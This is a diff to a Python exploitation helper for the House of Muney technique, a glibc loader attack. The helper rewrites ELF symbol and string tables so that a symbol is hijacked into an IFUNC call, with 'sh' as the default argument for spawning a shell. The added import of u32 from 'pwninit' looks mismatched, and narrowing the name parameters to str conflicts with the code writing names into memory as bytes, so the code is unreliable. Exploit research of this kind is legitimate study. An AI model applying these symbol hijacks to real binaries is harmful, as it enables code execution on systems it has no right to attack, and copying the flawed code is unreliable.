@@ -1,3 +1,7 @@
+from pwn import ELF, flat
+from pwninit import u32
+from .constants import *
+
 class HouseOfMuney:
     """Exploitation helper for the House of Muney technique.
     
@@ -57,7 +61,7 @@ class HouseOfMuney:
         off = self.symbol_offset(name)
         self.write(off, self.dynsym.structs.Elf_Sym.build(sym))
 
-    def set_call(self, name: str | bytes, offset: int, data: bytes = b"sh\0"):
+    def set_call(self, name: str, offset: int, data: bytes = b"sh\0"):
         """Hijack a symbol to act as a GNU indirect function (IFUNC) call.
 
         Args:
@@ -75,7 +79,7 @@ class HouseOfMuney:
         self.write(self.strtab() + idx, name)
         self.write(self.strtab() + idx + len(name), b"\0")
 
-    def set_offset(self, name: str | bytes, offset: int):
+    def set_offset(self, name: str, offset: int):
         """Directly patch the virtual value offset of a specific symbol.
 
         Args:
